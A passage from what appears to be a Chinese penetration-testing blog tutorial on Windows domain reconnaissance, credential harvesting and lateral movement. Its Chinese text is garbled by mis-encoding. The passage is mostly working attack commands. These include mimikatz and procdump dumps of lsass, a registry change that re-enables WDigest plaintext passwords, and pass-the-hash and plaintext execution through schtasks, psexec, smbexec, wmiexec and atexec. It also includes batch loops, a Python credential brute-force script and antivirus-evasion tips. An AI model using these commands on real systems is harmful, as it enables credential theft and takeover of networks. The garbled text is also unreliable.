Adminsï¼šä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç”¨æˆ·ï¼ˆé»˜è®¤å¯¹åŸŸæ§åˆ¶å™¨æœ‰å®Œå…¨æ§åˆ¶æƒï¼‰ç›¸å…³ç”¨æˆ·æ”¶é›†æ“ä½œå‘½ä»¤ï¼šwhoami /all ç”¨æˆ·æƒé™net config workstation ç™»å½•ä¿¡æ¯net user æœ¬åœ°ç”¨æˆ·net localgroup æœ¬åœ°ç”¨æˆ·ç»„net user /domain è·å–åŸŸç”¨æˆ·ä¿¡æ¯net group /domain è·å–åŸŸç”¨æˆ·ç»„ä¿¡æ¯wmic useraccount get /all æ¶‰åŠåŸŸç”¨æˆ·è¯¦ç»†ä¿¡æ¯net group &quot;Domain Admins&quot; /domain æŸ¥è¯¢åŸŸç®¡ç†å‘˜è´¦æˆ·net group &quot;Enterprise Admins&quot; /domain æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„net group &quot;Domain Controllers&quot; /domain æŸ¥è¯¢åŸŸæ§åˆ¶å™¨</code></pre><p><strong>å‡­æ®ä¿¡æ¯æ”¶é›†æ“ä½œ:</strong></p><p>æ”¶é›†å„ç§å¯†æ–‡ï¼Œæ˜æ–‡ï¼Œå£ä»¤ç­‰ï¼Œä¸ºåç»­æ¨ªå‘æ¸—é€åšå¥½æµ‹è¯•å‡†å¤‡</p><pre><code>è®¡ç®—æœºç”¨æˆ· HASHï¼Œæ˜æ–‡è·å–-mimikatz(win)ï¼Œmimipenguin(linux)è®¡ç®—æœºå„ç§åè®®æœåŠ¡å£ä»¤è·å–-LaZagne(all)ï¼ŒXenArmor(win)Netsh WLAN show profilesNetsh WLAN show profile name=&quot;æ— çº¿åç§°&quot; key=clear1.ç«™ç‚¹æºç å¤‡ä»½æ–‡ä»¶ã€æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ç­‰2.å„ç±»æ•°æ®åº“ Web ç®¡ç†å…¥å£ï¼Œå¦‚ PHPMyAdmin3.æµè§ˆå™¨ä¿å­˜å¯†ç ã€æµè§ˆå™¨ Cookies4.å…¶ä»–ç”¨æˆ·ä¼šè¯ã€3389 å’Œ ipc$è¿æ¥è®°å½•ã€å›æ”¶ç«™å†…å®¹5.Windows ä¿å­˜çš„ WIFI å¯†ç 6.ç½‘ç»œå†…éƒ¨çš„å„ç§å¸å·å’Œå¯†ç ï¼Œå¦‚ï¼šEmailã€VPNã€FTPã€OA ç­‰</code></pre><p><strong>æ¢é’ˆä¸»æœºåŸŸæ§æ¶æ„æœåŠ¡:</strong></p><p>ä¸ºåç»­æ¨ªå‘æ€è·¯åšå‡†å¤‡ï¼Œé’ˆå¯¹åº”ç”¨ï¼Œåè®®ç­‰å„ç±»æ”»å‡»æ‰‹æ³•</p><pre><code>æ¢é’ˆåŸŸæ§åˆ¶å™¨ååŠåœ°å€ä¿¡æ¯net time /domain nslookup pingæ¢é’ˆåŸŸå†…å­˜æ´»ä¸»æœºåŠåœ°å€ä¿¡æ¯nbtscan 192.168.3.0/24 ç¬¬ä¸‰æ–¹å·¥å…·for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot; è‡ªå¸¦å†…éƒ¨å‘½ä»¤nmap masscan ç¬¬ä¸‰æ–¹ PowerShell è„šæœ¬ nishang empire ç­‰#å¯¼å…¥æ¨¡å— nishangImport-Module .\nishang.psm1#è®¾ç½®æ‰§è¡Œç­–ç•¥Set-ExecutionPolicy RemoteSigned#è·å–æ¨¡å— nishang çš„å‘½ä»¤å‡½æ•°Get-Command -Module nishang#è·å–å¸¸è§„è®¡ç®—æœºä¿¡æ¯Get-Information#ç«¯å£æ‰«æï¼ˆæŸ¥çœ‹ç›®å½•å¯¹åº”æ–‡ä»¶æœ‰æ¼”ç¤ºè¯­æ³•ï¼Œå…¶ä»–åŒç†ï¼‰Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort#å…¶ä»–åŠŸèƒ½ï¼šåˆ é™¤è¡¥ä¸ï¼Œåå¼¹ Shellï¼Œå‡­æ®è·å–ç­‰æ¢é’ˆåŸŸå†…ä¸»æœºè§’è‰²åŠæœåŠ¡ä¿¡æ¯åˆ©ç”¨å¼€æ”¾ç«¯å£æœåŠ¡åŠè®¡ç®—æœºååˆ¤æ–­æ ¸å¿ƒä¸šåŠ¡æœºå™¨:1.é«˜çº§ç®¡ç†äººå‘˜ã€ç³»ç»Ÿç®¡ç†å‘˜ã€è´¢åŠ¡/äººäº‹/ä¸šåŠ¡äººå‘˜çš„ä¸ªäººè®¡ç®—æœº2.äº§å“ç®¡ç†ç³»ç»ŸæœåŠ¡å™¨3.åŠå…¬ç³»ç»ŸæœåŠ¡å™¨4.è´¢åŠ¡åº”ç”¨ç³»ç»ŸæœåŠ¡å™¨5.æ ¸å¿ƒäº§å“æºç æœåŠ¡å™¨ï¼ˆè‡ªå»º SVNã€GITï¼‰6.æ•°æ®åº“æœåŠ¡å™¨7.æ–‡ä»¶æˆ–ç½‘ç›˜æœåŠ¡å™¨ã€å…±äº«æœåŠ¡å™¨8.ç”µå­é‚®ä»¶æœåŠ¡å™¨9.ç½‘ç»œç›‘æ§ç³»ç»ŸæœåŠ¡å™¨10.å…¶ä»–æœåŠ¡å™¨ï¼ˆå†…éƒ¨æŠ€æœ¯æ–‡æ¡£æœåŠ¡å™¨ã€å…¶ä»–ç›‘æ§æœåŠ¡å™¨ç­‰ï¼‰</code></pre><h1 id="åŸŸæ¨ªå‘"><a href="#åŸŸæ¨ªå‘" class="headerlink" title="åŸŸæ¨ªå‘"></a>åŸŸæ¨ªå‘</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/1b22fbb60e7aa3f167c08e67c61e025e73769fd3.png@942w_611h_progressive.webp" alt="img"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320150741924.png" alt="image-20220320150741924"></p><h2 id="åŸŸæ¨ªå‘å¿…å¤‡çŸ¥è¯†ç‚¹"><a href="#åŸŸæ¨ªå‘å¿…å¤‡çŸ¥è¯†ç‚¹" class="headerlink" title="åŸŸæ¨ªå‘å¿…å¤‡çŸ¥è¯†ç‚¹"></a><strong>åŸŸæ¨ªå‘å¿…å¤‡çŸ¥è¯†ç‚¹</strong></h2><p><strong>çŸ¥è¯†ç‚¹1ï¼š</strong><br>Windows2012ä»¥ä¸Šç‰ˆæœ¬é»˜è®¤å…³é—­wdigest,æ”»å‡»è€…æ— æ³•ä»å†…å­˜ä¸­è·å–æ˜æ–‡å¯†ç <br>Windows2012ä»¥ä¸‹ç‰ˆæœ¬å¦‚å®‰è£…KB2871997è¡¥ä¸ï¼ŒåŒæ ·ä¹Ÿä¼šå¯¼è‡´æ— æ³•è·å–æ˜æ–‡å¯†ç </p><pre><code>é’ˆå¯¹ä»¥ä¸Šæƒ…å†µï¼Œæˆ‘ä»¬æä¾›äº†4ç§æ–¹å¼è§£å†³æ­¤ç±»é—®é¢˜1.åˆ©ç”¨å“ˆå¸Œ hash ä¼ é€’(pthï¼Œptkç­‰)è¿›è¡Œç§»åŠ¨2.åˆ©ç”¨å…¶å®ƒæœåŠ¡åè®®(SMB,WMIç­‰)è¿›è¡Œå“ˆå¸Œç§»åŠ¨3.åˆ©ç”¨æ³¨å†Œè¡¨æ“ä½œå¼€å¯Wdigest Authå€¼è¿›è¡Œè·å–4.åˆ©ç”¨å·¥å…·æˆ–ç¬¬ä¸‰æ–¹å¹³å°(Hachcat)è¿›è¡Œç ´è§£è·å–</code></pre><pre><code>#æ³¨å†Œè¡¨æ“ä½œå¼€å¯Wdigest Authå€¼reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p><strong>çŸ¥è¯†ç‚¹2ï¼š</strong><br>Windowsç³»ç»ŸLM HashåŠNTLM HashåŠ å¯†ç®—æ³•ï¼Œä¸ªäººç³»ç»Ÿåœ¨Windows vistaåï¼ŒæœåŠ¡å™¨ç³»ç»Ÿåœ¨Windows 2003ä»¥åï¼Œè®¤è¯æ–¹å¼å‡ä¸ºNTLM Hashã€‚</p><pre><code>#è·å–winå¯†ç hashçš„ä¸¤ä¸ªå·¥å…·Pwdump7QuarksPwdump</code></pre><p><strong>çŸ¥è¯†ç‚¹3ï¼š</strong><br>åŸŸç”¨æˆ·ä¸æœ¬åœ°ç”¨æˆ·çš„åŒºåˆ«<br>æ¯”å¦‚ï¼Œ<code>god/administrator</code>æ˜¯åŸŸç”¨æˆ·ï¼Œ<code>./administrator</code>æ˜¯æœ¬åœ°ç”¨æˆ·</p><h2 id="at-amp-amp-schtasks-å¯†ç æ˜¯æ˜æ–‡"><a href="#at-amp-amp-schtasks-å¯†ç æ˜¯æ˜æ–‡" class="headerlink" title="at&amp;&amp;schtasks(å¯†ç æ˜¯æ˜æ–‡)"></a><strong>at&amp;&amp;schtasks(å¯†ç æ˜¯æ˜æ–‡)</strong></h2><p><strong>ä¼˜ç‚¹:å®˜æ–¹è‡ªå¸¦å‘½ä»¤ï¼Œä¸ä¼šè¢«æ€</strong></p><p><strong>ç¼ºç‚¹:å‘½ä»¤æ¯”è¾ƒç¹çï¼Œä¸”åªæ”¯æŒæ˜æ–‡å¯†ç </strong></p><p>åœ¨æ‹¿ä¸‹ä¸€å°å†…ç½‘ä¸»æœºåï¼Œé€šè¿‡æœ¬åœ°ä¿¡æ¯æœé›†æ”¶é›†ç”¨æˆ·å‡­è¯ç­‰ä¿¡æ¯åï¼Œå¦‚ä½•æ¨ªå‘æ¸—é€æ‹¿ä¸‹æ›´å¤šçš„ä¸»æœºï¼Ÿ è¿™é‡Œä»‹ç» at&amp;schtasks å‘½ä»¤çš„ä½¿ç”¨ï¼Œåœ¨å·²çŸ¥ç›®æ ‡ç³»ç»Ÿçš„ç”¨æˆ·æ˜æ–‡å¯†ç çš„åŸºç¡€ä¸Šï¼Œç›´æ¥å¯ä»¥åœ¨è¿œç¨‹ä¸» æœºä¸Šæ‰§è¡Œå‘½ä»¤</p><p>è·å–åˆ°æŸåŸŸä¸»æœºæƒé™â€“&gt;minikatz å¾—åˆ°å¯†ç ï¼ˆæ˜æ–‡ï¼Œhashï¼‰â€“&gt;ç”¨åˆ°ä¿¡æ¯æ”¶é›†é‡Œé¢åŸŸç”¨æˆ·çš„åˆ—è¡¨å½“åšç”¨æˆ·åå­—å…¸-&gt;ç”¨åˆ°å¯†ç æ˜æ–‡å½“åšå¯†ç å­—å…¸â€“&gt;å°è¯•è¿æ¥â€“&gt;åˆ›å»ºè®¡åˆ’ä»»åŠ¡(at|schtasks)â€“&gt;æ‰§è¡Œæ–‡ä»¶å¯ä¸ºåé—¨æˆ–è€…ç›¸å…³å‘½ä»¤</p><p>åˆ©ç”¨æµç¨‹:</p><ol><li>å»ºç«‹ IPC é“¾æ¥åˆ°ç›®æ ‡ä¸»æœº (ç›®æ ‡ä¸»æœºè¦å¼€å¯135ï¼Œ445)</li><li> æ‹·è´è¦æ‰§è¡Œçš„å‘½ä»¤è„šæœ¬åˆ°ç›®æ ‡ä¸»æœº </li><li>æŸ¥çœ‹ç›®æ ‡æ—¶é—´ï¼Œåˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼ˆatã€schtasksï¼‰å®šæ—¶æ‰§è¡Œæ‹·è´åˆ°çš„è„šæœ¬ </li><li> åˆ é™¤ IPC é“¾æ¥ </li></ol><pre><code>net use \\server\ipc$&quot;password&quot; /user:username # å·¥ä½œç»„ net use \\server\ipc$&quot;password&quot; /user:domain\username #åŸŸå†… dir \\xx.xx.xx.xx\C$\ # æŸ¥çœ‹æ–‡ä»¶åˆ—è¡¨ copy \\xx.xx.xx.xx\C$\1.bat 1.bat # ä¸‹è½½æ–‡ä»¶ copy 1.bat \\xx.xx.xx.xx\C$ # å¤åˆ¶æ–‡ä»¶ net use \\xx.xx.xx.xx\C$\1.bat /del # åˆ é™¤ IPC net view xx.xx.xx.xx # æŸ¥çœ‹å¯¹æ–¹å…±äº« #å»ºç«‹ IPC å¸¸è§çš„é”™è¯¯ä»£ç  ï¼ˆ1ï¼‰5ï¼šæ‹’ç»è®¿é—®ï¼Œå¯èƒ½æ˜¯ä½¿ç”¨çš„ç”¨æˆ·ä¸æ˜¯ç®¡ç†å‘˜æƒé™ï¼Œéœ€è¦å…ˆæå‡æƒé™ ï¼ˆ2ï¼‰51ï¼šç½‘ç»œé—®é¢˜ï¼ŒWindows æ— æ³•æ‰¾åˆ°ç½‘ç»œè·¯å¾„ ï¼ˆ3ï¼‰53ï¼šæ‰¾ä¸åˆ°ç½‘ç»œè·¯å¾„ï¼Œå¯èƒ½æ˜¯ IP åœ°å€é”™è¯¯ã€ç›®æ ‡æœªå¼€æœºã€ç›®æ ‡ Lanmanserver æœåŠ¡æœªå¯åŠ¨ã€æœ‰ é˜²ç«å¢™ç­‰é—®é¢˜ ï¼ˆ4ï¼‰67ï¼šæ‰¾ä¸åˆ°ç½‘ç»œåï¼Œæœ¬åœ° Lanmanworkstation æœåŠ¡æœªå¯åŠ¨ï¼Œç›®æ ‡åˆ é™¤ ipc$ ï¼ˆ5ï¼‰1219ï¼šæä¾›çš„å‡­æ®å’Œå·²å­˜åœ¨çš„å‡­æ®é›†å†²çªï¼Œè¯´æ˜å·²å»ºç«‹ IPC$ï¼Œéœ€è¦å…ˆåˆ é™¤ ï¼ˆ6ï¼‰1326ï¼šè´¦å·å¯†ç é”™è¯¯ ï¼ˆ7ï¼‰1792ï¼šç›®æ ‡ NetLogon æœåŠ¡æœªå¯åŠ¨ï¼Œè¿æ¥åŸŸæ§å¸¸å¸¸ä¼šå‡ºç°æ­¤æƒ…å†µ ï¼ˆ8ï¼‰2242ï¼šç”¨æˆ·å¯†ç è¿‡æœŸï¼Œç›®æ ‡æœ‰è´¦å·ç­–ç•¥ï¼Œå¼ºåˆ¶å®šæœŸæ›´æ”¹å¯†ç  #å»ºç«‹ IPC å¤±è´¥çš„åŸå›  ï¼ˆ1ï¼‰ç›®æ ‡ç³»ç»Ÿä¸æ˜¯ NT æˆ–ä»¥ä¸Šçš„æ“ä½œç³»ç»Ÿ ï¼ˆ2ï¼‰å¯¹æ–¹æ²¡æœ‰æ‰“å¼€ IPC$å…±äº« ï¼ˆ3ï¼‰å¯¹æ–¹æœªå¼€å¯ 139ã€445 ç«¯å£ï¼Œæˆ–è€…è¢«é˜²ç«å¢™å±è”½ ï¼ˆ4ï¼‰è¾“å‡ºå‘½ä»¤ã€è´¦å·å¯†ç æœ‰é”™è¯¯</code></pre><pre><code>[at] &amp; [schtasks]#at &lt; Windows2012net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # å»ºç«‹ ipc è¿æ¥ï¼šcopy add.bat \\192.168.3.21\c$ #æ‹·è´æ‰§è¡Œæ–‡ä»¶åˆ°ç›®æ ‡æœºå™¨at \\192.168.3.21 15:47 c:\add.bat #æ·»åŠ è®¡åˆ’ä»»åŠ¡#schtasks &gt;=Windows2012net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\administrator # å»ºç«‹ ipc è¿æ¥ï¼šcopy add.bat \\192.168.3.32\c$ #å¤åˆ¶æ–‡ä»¶åˆ°å…¶ C ç›˜schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #åˆ›å»º adduser ä»»åŠ¡å¯¹åº”æ‰§è¡Œæ–‡ä»¶schtasks /run /s 192.168.3.32 /tn adduser /i #è¿è¡Œ adduser ä»»åŠ¡schtasks /delete /s 192.168.3.21 /tn adduser /f#åˆ é™¤ adduser ä»»åŠ¡</code></pre><h2 id="atexec-impacket-æ˜æ–‡å’ŒHASH-ä¼ é€’æ”»å‡»"><a href="#atexec-impacket-æ˜æ–‡å’ŒHASH-ä¼ é€’æ”»å‡»" class="headerlink" title="atexec-impacket æ˜æ–‡å’ŒHASH ä¼ é€’æ”»å‡»"></a><strong>atexec-impacket æ˜æ–‡å’ŒHASH ä¼ é€’æ”»å‡»</strong></h2><p><strong>impacketçš„exeç‰ˆæœ¬:<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></strong></p><p><strong>ä¼˜ç‚¹:å‘½ä»¤ç®€å•ï¼Œæ˜“ä¸Šæ‰‹</strong></p><p><strong>ç¼ºç‚¹:éå®˜æ–¹è‡ªå¸¦ï¼Œå¯èƒ½è¢«æ€</strong></p><pre><code>atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320153845240.png" alt="image-20220320153845240"></p><p><strong>æ˜æ–‡ HASH ä¼ é€’æ‰¹é‡åˆ©ç”¨</strong></p><p>æ”¶é›†æ´»è·ƒipï¼Œæ”¾åœ¨ip.txtä¸­</p><pre><code>FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;admin!@#45&quot; /user:administrator #æ‰¹é‡æ£€æµ‹ IP å¯¹åº”æ˜æ–‡è¿æ¥FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #æ‰¹é‡æ£€æµ‹ IP å¯¹åº”æ˜æ–‡å›æ˜¾ç‰ˆ</code></pre><p>æ”¶é›†å¯èƒ½çš„å¯†ç å’Œhashæ”¾åœ¨æ–‡ä»¶ä¸­</p><pre><code>FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #æ‰¹é‡æ£€æµ‹æ˜æ–‡å¯¹åº” IPå›æ˜¾ç‰ˆFOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #æ‰¹é‡æ£€æµ‹ HASH å¯¹åº” IP å›æ˜¾ç‰ˆ</code></pre><p><strong>æ˜æ–‡HASHä¼ é€’æ‰¹é‡åˆ©ç”¨-å‡çº§ç‰ˆ</strong></p><p>åˆ©ç”¨pyè„šæœ¬åˆ¶ä½œçš„exeæ–‡ä»¶æ‰¹é‡å°è¯•æ¨ªå‘æ¸—é€</p><p>Fuck.py</p><pre><code class="python">import osimport timeips=&#123;    &#39;192.168.3.30&#39;,    &#39;192.168.3.25&#39;,    &#39;192.168.3.32&#39;,    &#39;192.168.3.29&#39;&#125;users=&#123;    &#39;admin&#39;,    &#39;user&#39;,    &#39;Administrator&#39;,    &#39;webadmin&#39;,    &#39;boss&#39;&#125;passwds=&#123;    &#39;123456&#39;,    &#39;passwd&#39;,    &#39;admin123&#39;    &#39;admin666&#39;&#125;for ip in ips:    for user in users:        for passwd in passwds:            exec = &quot;net use \\&quot;+ &quot;\\&quot; + ip +&#39;ipc$ &#39;+passwd+&#39; /user:god\\&#39; + user            print(&#39;----&gt;&#39;+exec+&#39;&lt;----&#39;)            os.system(exec)            time.sleep(1)</code></pre><p>æ‰§è¡Œæ•ˆæœ</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320161721565.png" alt="image-20220320161721565"></p><p>å°†pythonè„šæœ¬ç¼–è¯‘æˆexeæ–‡ä»¶</p><p>å®‰è£…pyinstaller</p><pre><code>pip install pyinstaller</code></pre><p>ç”Ÿæˆå¯æ‰§è¡ŒEXE</p><pre><code>Pyinstaller -F [.pyæ–‡ä»¶]</code></pre><p>ä¼šç”Ÿæˆä¸€ä¸ªåŒåçš„exeæ–‡ä»¶ </p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162043000.png" alt="image-20220320162043000"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162242560.png" alt="image-20220320162242560"></p><h2 id="Procdump-Mimikatz-é…åˆè·å–hashå¯†ç "><a href="#Procdump-Mimikatz-é…åˆè·å–hashå¯†ç " class="headerlink" title="Procdump+Mimikatz é…åˆè·å–hashå¯†ç "></a><strong>Procdump+Mimikatz é…åˆè·å–hashå¯†ç </strong></h2><p>è¿™ç§æƒ…å†µé€‚ç”¨äºmimikatzè¢«æ€ï¼Œä½†æ˜¯è‡ªå·±åšå…æ€å¤±è´¥/æˆ–ä¸æƒ³åšå…æ€å¯ä»¥æ¥ä¸Procdumpé…åˆä½¿ç”¨ï¼Œå› ä¸ºProcdumpæ˜¯å®˜æ–¹è‡ªå¸¦çš„ï¼Œæ‰€ä»¥ä¸ä¼šè¢«æ€</p><ul><li>Procdumpä¸‹è½½ï¼š<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></li><li>mimikatzä¸‹è½½ï¼š<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></li></ul><pre><code># procdump åœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œprocdump -accepteula -ma lsass.exe lsass.dmp# mimikatz åœ¨æœ¬åœ°æ‰§è¡Œï¼šprivilege::debugesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320165205243.png" alt="image-20220320165205243"></p><p>ç„¶åå¯ä»¥åˆ©ç”¨ Hashcat ç ´è§£è·å– Windows NTML Hash</p><h2 id="SMB-æœåŠ¡åˆ©ç”¨-psexec-å®˜æ–¹è‡ªå¸¦-ç¬¬ä¸‰æ–¹-smbexec-åªæœ‰ç¬¬ä¸‰æ–¹"><a href="#SMB-æœåŠ¡åˆ©ç”¨-psexec-å®˜æ–¹è‡ªå¸¦-ç¬¬ä¸‰æ–¹-smbexec-åªæœ‰ç¬¬ä¸‰æ–¹" class="headerlink" title="SMB æœåŠ¡åˆ©ç”¨-psexec(å®˜æ–¹è‡ªå¸¦+ç¬¬ä¸‰æ–¹),smbexec(åªæœ‰ç¬¬ä¸‰æ–¹)"></a><strong>SMB æœåŠ¡åˆ©ç”¨-psexec(å®˜æ–¹è‡ªå¸¦+ç¬¬ä¸‰æ–¹),smbexec(åªæœ‰ç¬¬ä¸‰æ–¹)</strong></h2><p><strong>psexec</strong></p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">PsTools - Windows Sysinternals | Microsoft Docs</a></p><p>åˆ©ç”¨ SMB æœåŠ¡å¯ä»¥é€šè¿‡æ˜æ–‡æˆ– hash ä¼ é€’æ¥è¿œç¨‹æ‰§è¡Œï¼Œæ¡ä»¶ 445 æœåŠ¡ç«¯å£å¼€æ”¾ã€‚</p><pre><code>#psexec ç¬¬ä¸€ç§ï¼šå…ˆæœ‰ ipc é“¾æ¥ï¼Œpsexec éœ€è¦æ˜æ–‡æˆ– hash ä¼ é€’net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administratorpsexec \\192.168.3.32 -s cmd # éœ€è¦å…ˆæœ‰ ipc é“¾æ¥ -s ä»¥ System æƒé™è¿è¡Œexit #é€€å‡º</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320171306833.png" alt="image-20220320171306833"></p><pre><code>#psexec ç¬¬äºŒç§ï¼šä¸ç”¨å»ºç«‹ IPC ç›´æ¥æä¾›æ˜æ–‡è´¦æˆ·å¯†ç psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172223595.png" alt="image-20220320172223595"></p><p>ä½†æ˜¯å½“æˆ‘ä»¬ä½¿ç”¨hashä¼ é€’æ—¶</p><pre><code>psexec -hashes :$HASH$ ./administrator@10.1.2.3psexec -hashes :$HASH$ domain/administrator@10.1.2.3psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 å®˜æ–¹ Pstools æ— æ³•é‡‡ç”¨ hash è¿æ¥#éå®˜æ–¹è‡ªå¸¦-å‚è€ƒ impacket å·¥å…·åŒ…ä½¿ç”¨ï¼Œæ“ä½œç®€å•ï¼Œå®¹æ˜“è¢«æ€</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172705914.png" alt="image-20220320172705914"></p><p>å°±ä¼šå‡ºç°é—®é¢˜ï¼Œè¿™æ˜¯å› ä¸ºå®˜æ–¹ Pstools æ— æ³•é‡‡ç”¨ hash è¿æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ impacket å·¥å…·åŒ…</p><p>ç¼ºç‚¹:éå®˜æ–¹ï¼Œä¼šè¢«æ€æ¯’è½¯ä»¶æ€æ‰ï¼Œæ‰€ä»¥è¦åšå…æ€</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173053675.png" alt="image-20220320173053675"></p><p><strong>smbexec</strong></p><p>æ— éœ€å…ˆ ipc é“¾æ¥ æ˜æ–‡æˆ– hash ä¼ é€’</p><pre><code>smbexec god/administrator:Admin12345@192.168.3.21smbexec ./administrator:admin!@#45@192.168.3.32smbexec -hashes :$HASH$ ./admin@192.168.3.21smbbexec -hashes :$HASH$ domain/admin@192.168.3.21smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173615976.png" alt="image-20220320173615976"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173738115.png" alt="image-20220320173738115"></p><h2 id="WMI-æœåŠ¡åˆ©ç”¨-wmic-cscript-wmiexec"><a href="#WMI-æœåŠ¡åˆ©ç”¨-wmic-cscript-wmiexec" class="headerlink" title="WMI æœåŠ¡åˆ©ç”¨-wmic,cscript,wmiexec"></a><strong>WMI æœåŠ¡åˆ©ç”¨-wmic,cscript,wmiexec</strong></h2><p>WMI(Windows Management Instrumentation) æ˜¯é€šè¿‡ 135 ç«¯å£è¿›è¡Œåˆ©ç”¨ï¼Œæ”¯æŒç”¨æˆ·åæ˜æ–‡æˆ–è€… hash çš„æ–¹å¼è¿›è¡Œè®¤è¯ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•ä¸ä¼šåœ¨ç›®æ ‡æ—¥å¿—ç³»ç»Ÿç•™ä¸‹ç—•è¿¹ã€‚</p><p><strong>è‡ªå¸¦ WMIC æ˜æ–‡ä¼ é€’ æ— å›æ˜¾ æ‰€ä»¥å†™å…¥æ–‡ä»¶å¤¹åè¿˜è¦è‡ªå·±æƒ³åŠæ³•è¯»å–</strong></p><pre><code>wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;    </code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180441580.png" alt="image-20220320180441580"></p><p><strong>è‡ªå¸¦ cscript æ˜æ–‡ä¼ é€’ æœ‰å›æ˜¾</strong></p><pre><code>cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345#escriptä¸éœ€è¦ä¸‹è½½ï¼Œè‡ªå¸¦ã€‚ä½†æ˜¯éœ€è¦ç”¨åˆ°ç¬¬ä¸‰æ–¹ wmiexec.vbsï¼Œä½†æ˜¯wmiexec.vbså…æ€éå¸¸ç®€å•</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180646769.png" alt="image-20220320180646769"></p><p>å¥—ä»¶ impacket wmiexec æ˜æ–‡æˆ– hash ä¼ é€’ æœ‰å›æ˜¾ exe ç‰ˆæœ¬</p><pre><code>wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</code></pre><p>ç¼ºç‚¹ï¼šå®¹æ˜“è¢«æ€</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181811547.png" alt="image-20220320181811547"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181844775.png" alt="image-20220320181844775"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320182207418.png" alt="image-20220320182207418"></p><p>åŒç†å¯ä»¥å€Ÿç”¨ç¼–ç¨‹è§£æ”¾åŒæ‰‹</p><p><strong>hash æ‰¹é‡åˆ©ç”¨-python ç¼–è¯‘ exe</strong></p><pre><code class="python">#pyinstaller.exe -F fuck_neiwang_002.pyimport 